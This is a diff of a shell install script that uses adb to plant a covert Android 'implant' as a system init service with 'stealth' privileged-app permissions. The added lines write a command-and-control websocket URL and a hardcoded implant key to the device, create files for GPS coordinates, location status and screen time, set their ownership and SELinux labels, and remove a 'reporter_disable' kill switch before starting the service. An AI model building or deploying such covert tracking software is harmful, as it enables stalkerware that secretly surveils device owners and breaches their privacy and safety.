@@ -40,15 +40,17 @@ adb shell chmod 644 /system/etc/permissions/privapp-permissions-stealth.xml
 adb shell "restorecon -v /system/bin/reporter /system/etc/init/reporter.rc 2>/dev/null || true"
 adb shell "restorecon -v /system/etc/permissions/privapp-permissions-stealth.xml 2>/dev/null || true"
 
-adb shell "touch /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled"
-adb shell "chmod 666 /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled"
+adb shell 'mkdir -p /data/local/tmp /data/system
+  printf "%s\n" "ws://127.0.0.1:8000/ws" > /data/local/tmp/c2_url.txt
+  printf "%s\n" "DeltaForce2027" > /data/local/tmp/implant.key
+  printf "%s\n" "60" > /data/system/ping_interval.txt
+  touch /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt
+  rm -f /data/local/tmp/reporter_disable
+  chmod 666 /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable 2>/dev/null || true
+  chmod 644 /data/system/ping_interval.txt 2>/dev/null || true
+  chown system:system /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable 2>/dev/null || true
+  chown root:root /data/system/ping_interval.txt 2>/dev/null || true
+  chcon u:object_r:system_data_file:s0 /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable /data/system/ping_interval.txt 2>/dev/null || true'
 
-# FIX S-3: pre-create implant.key so Java apps can read it immediately at boot,
-# before reporter starts and writes it. Avoids the race window on first boot.
-IMPLANT_KEY="DeltaForce2027"  # change this if you've reconfigured the server
-echo "$IMPLANT_KEY" | adb shell "cat > /data/local/tmp/implant.key"
-adb shell chmod 644 /data/local/tmp/implant.key
-
-adb shell "rm -f /data/local/tmp/reporter_disable"
 adb shell "start system_telemetry_service"
 echo "Implant and Stealth priv-apps have been installed. Reboot the device for the new init service and apps to be loaded."
